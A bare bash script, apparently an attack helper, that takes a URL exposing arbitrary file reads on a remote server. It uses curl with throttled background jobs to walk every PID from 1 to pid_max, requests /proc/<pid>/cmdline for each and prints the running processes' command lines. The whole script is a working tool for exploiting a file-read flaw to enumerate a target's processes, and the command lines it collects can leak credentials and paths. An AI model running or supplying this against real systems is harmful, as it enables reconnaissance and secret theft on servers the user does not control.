#!/bin/bash

set -eu

max=20
url="$1"
maxpid="$(curl --silent "$url/proc/sys/kernel/pid_max")"
selfcmdline="$(curl --silent "$url/proc/self/cmdline" | strings | tr '\r\n' ' ')"

function getpid(){
  pid="$1"
  cmdline="$(curl --silent "$url/proc/$pid/cmdline" | strings | tr '\r\n' ' ')"
  if [[ "$cmdline" != "" && "$cmdline" != "$selfcmdline" ]];then
    echo -e "PID: $pid\t$cmdline"
  fi
}

for ((pid=1; pid<="$maxpid"; pid++));do
  while [[ $(jobs -l | grep Running | wc -l 2> /dev/null) -gt $max ]];do
    sleep 0.3
  done
  getpid "$pid" &
done
